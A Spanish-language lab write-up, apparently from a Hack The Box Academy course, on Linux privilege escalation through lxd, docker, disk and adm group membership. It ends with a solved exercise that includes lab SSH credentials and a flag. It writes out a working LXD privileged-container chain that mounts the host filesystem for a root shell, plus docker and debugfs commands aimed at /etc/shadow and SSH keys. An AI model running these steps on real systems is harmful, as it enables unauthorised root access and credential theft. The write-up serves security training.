
# Grupos privilegiados

### Grupo LXC / LXD

LXD es similar a Docker y es el administrador de contenedores de Ubuntu. Tras la instalación, todos los usuarios se agregan al grupo LXD. La pertenencia a este grupo se puede utilizar para escalar privilegios mediante la creación de un contenedor LXD, haciéndolo privilegiado y luego accediendo al sistema de archivos del host en `/mnt/root`. Confirmemos la pertenencia al grupo y usemos estos derechos para escalar a root.

```shell-session
devops@NIX02:~$ id

uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)
```

Descomprima la imagen de Alpine.

```shell-session
devops@NIX02:~$ unzip alpine.zip 

Archive:  alpine.zip
extracting: 64-bit Alpine/alpine.tar.gz  
inflating: 64-bit Alpine/alpine.tar.gz.root  
cd 64-bit\ Alpine/
```

Inicie el proceso de inicialización de LXD. Elija los valores predeterminados para cada solicitud. Consulte esta [publicación](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) para obtener más información sobre cada paso.

```shell-session
devops@NIX02:~$ lxd init

Do you want to configure a new storage pool (yes/no) [default=yes]? yes
Name of the storage backend to use (dir or zfs) [default=dir]: dir
Would you like LXD to be available over the network (yes/no) [default=no]? no
Do you want to configure the LXD bridge (yes/no) [default=yes]? yes

/usr/sbin/dpkg-reconfigure must be run as root
error: Failed to configure the bridge
```

Importar la imagen local.

```shell-session
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

Generating a client certificate. This may take a minute...
If this is your first time using LXD, you should also run: sudo lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b
```

Inicie un contenedor privilegiado con el conjunto `security.privileged` en `true` para ejecutar el contenedor sin una asignación de UID, lo que hace que el usuario raíz en el contenedor sea el mismo que el usuario raíz en el host.

```shell-session
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true

Creating r00t
```

Monte el sistema de archivos del host.

```shell-session
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

Device mydev added to r00t
```

Por último, crea un shell dentro de la instancia del contenedor. Ahora podemos explorar el sistema de archivos del host montado como root. Por ejemplo, para acceder al contenido del directorio raíz en el tipo de host `cd /mnt/root/root`. Desde aquí podemos leer archivos confidenciales como `/etc/shadow`, obtener hashes de contraseñas u obtener acceso a claves SSH para conectarnos al sistema host como root, y más.

```shell-session
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh

~ # id
uid=0(root) gid=0(root)
~ # 
```

***

### Grupo Docker

Colocar un usuario en el grupo docker es esencialmente equivalente al acceso de nivel raíz al sistema de archivos sin necesidad de una contraseña. Los miembros del grupo docker pueden generar nuevos contenedores docker. Un ejemplo sería ejecutar el comando `docker run -v /root:/mnt -it ubuntu`. Este comando crea una nueva instancia de Docker con el directorio `/root` en el sistema de archivos del host montado como un volumen. Una vez que se inicia el contenedor, podemos navegar hasta el directorio montado y recuperar o agregar claves SSH para el usuario root. Esto se puede hacer para otros directorios, como `/etc` que se puede usar para recuperar el contenido del archivo `/etc/shadow` para crackear contraseñas sin conexión o agregar un usuario privilegiado.

***

### Grupo Disks

Los usuarios dentro del grupo de `disks` tienen acceso total a todos los dispositivos incluidos en `/dev`, como `/dev/sda1`, que suele ser el dispositivo principal que utiliza el sistema operativo. Un atacante con estos privilegios puede utilizar `debugfs` para acceder a todo el sistema de archivos con privilegios de nivel root.&#x20;

```bash
sudo debugfs /dev/sda1
```

Al igual que con el ejemplo del grupo Docker, esto se podría aprovechar para recuperar claves SSH, credenciales o para agregar un usuario.

#### Ver usuarios del grupo disks

```bash
getent group disk
```

***

### Grupo ADM

Los miembros del grupo adm pueden leer todos los registros almacenados en `/var/log`. Esto no otorga acceso directo a la raíz, pero se puede aprovechar para recopilar datos confidenciales almacenados en archivos de registro o enumerar acciones de los usuarios y trabajos cron en ejecución.

```shell-session
secaudit@NIX02:~$ id

uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)
```

***

## <mark style="color:purple;">Caso práctico</mark>

```
SSH a 10.129.148.62 (ACADEMY-LPE-NIX02)
User "secaudit"
Password "Academy_LLPE!"
```

### Pregunta 1

> Utiliza los derechos de grupo privilegiados del usuario `secaudit` para localizar una flag.

```shell-session
secaudit@NIX02:~$ id
uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)

secaudit@NIX02:~$ sudo -l
[sudo] password for secaudit: 
Sorry, user secaudit may not run sudo on NIX02.
```

Nos logueamos y lo primero que observamos es que este usuario no puede ejecutar sudo, pero vemos que pertenece al grupo `adm`, lo que nos permite leer todos los registros almacenados en `/var/log`.

```shell-session
secaudit@NIX02:/var/log$ ls

alternatives.log  btmp            journal   tallylog              vmware-network.3.log  vmware-network.9.log  vmware-vmsvc-root.1.log
apache2           dist-upgrade    kern.log  ubuntu-advantage.log  vmware-network.4.log  vmware-network.log    vmware-vmsvc-root.2.log
apport.log        dpkg.log        lastlog   unattended-upgrades   vmware-network.5.log  vmware-vmsvc.1.log    vmware-vmsvc-root.3.log
apt               faillog         lxd       upgrade               vmware-network.6.log  vmware-vmsvc.2.log    vmware-vmsvc-root.log
auth.log          fontconfig.log  mysql     vmware-network.1.log  vmware-network.7.log  vmware-vmsvc.3.log    vmware-vmtoolsd-root.log
bootstrap.log     installer       syslog    vmware-network.2.log  vmware-network.8.log  vmware-vmsvc.log      wtmp
```

Vemos que hay un montón de archivos y directorios, por lo que vamos a filtrar con grep buscando la cadena '`HTB{`' que es el formato de flag por defecto en Hack the Box:

```shell-session
secaudit@NIX02:/var/log$ grep -ri 'HTB{' /var/log/* 2>/dev/null

Binary file /var/log/journal/4cdc7d14be432b0282d6f28a5f4bdb8c/system.journal matches

/var/log/apache2/access.log:10.10.14.3 - - [01/Sep/2020:05:34:22 +0200] "GET /flag%20=%20ch3ck_th0se_gr0uP_m3mb3erSh1Ps! HTTP/1.1" 301 409 "-" "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0"
```

Bingo! Obtenemos la flag: `ch3ck_th0se_gr0uP_************!`
